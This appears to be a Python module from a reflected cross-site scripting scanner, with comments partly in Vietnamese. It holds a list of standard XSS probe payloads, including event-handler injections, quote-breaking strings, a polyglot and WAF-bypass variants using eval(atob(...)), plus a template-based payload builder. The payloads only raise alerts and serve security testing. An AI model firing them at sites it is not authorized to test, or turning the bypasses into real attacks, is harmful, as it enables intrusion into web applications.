#!/usr/bin/env python3
"""
Payload Generator for XSS (Cross-Site Scripting) Scanner - Reflected XSS only
"""


class XSSPayloadGenerator:
    def __init__(self):
        self.reflected_payloads = []
        # Các phương thức DOM, stored và blind vẫn giữ lại nhưng không được sử dụng
        self.dom_based_payloads = []
        self.stored_payloads = []
        self.blind_payloads = []

        self._init_payloads()

    def _init_payloads(self):
        """Initialize the payload lists with common XSS payloads"""

        # Basic XSS payloads - hiện tại chỉ sử dụng reflected XSS
        self.reflected_payloads = [
            # Simple alerts
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "';alert(1);//",
            "\";alert(1);//",

            # Script tag variations
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>",
            "<ScRiPt>alert(1)</sCriPt>",

            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe onload=alert(1)>",

            # Javascript URI
            "<a href='javascript:alert(1)'>XSS</a>",

            # Entities
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

            # Bypass sanitizers
            "<img src=1 onerror=alert(1)>",
            "<img src=x onerror='alert(1)'>",
            "<script>console.log(1)</script>",

            # JS injection
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "</script><script>alert(1)</script>",

            # Nested quotes
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",

            # XSS with HTML entities
            "&lt;script&gt;alert(1)&lt;/script&gt;",

            # Common bypasses for WAFs and filters
            "<script>alert`1`</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>"
        ]

    def get_all_payloads(self):
        """
        Get all XSS payloads - Chỉ sử dụng reflected payloads

        Returns:
            list: List of reflected XSS payloads
        """
        # Chỉ trả về reflected payloads
        return self.reflected_payloads

    def get_reflected_payloads(self):
        """Get reflected XSS payloads - Phương thức được sử dụng"""
        return self.reflected_payloads


    def generate_custom_payloads(self, template, values):
        """
        Generate custom payloads by substituting values into a template

        Args:
            template (str): Template with placeholders {}
            values (list): List of values to substitute

        Returns:
            list: List of customized payloads
        """
        custom_payloads = []

        for value in values:
            custom_payload = template.format(value)
            custom_payloads.append(custom_payload)

        return custom_payloads
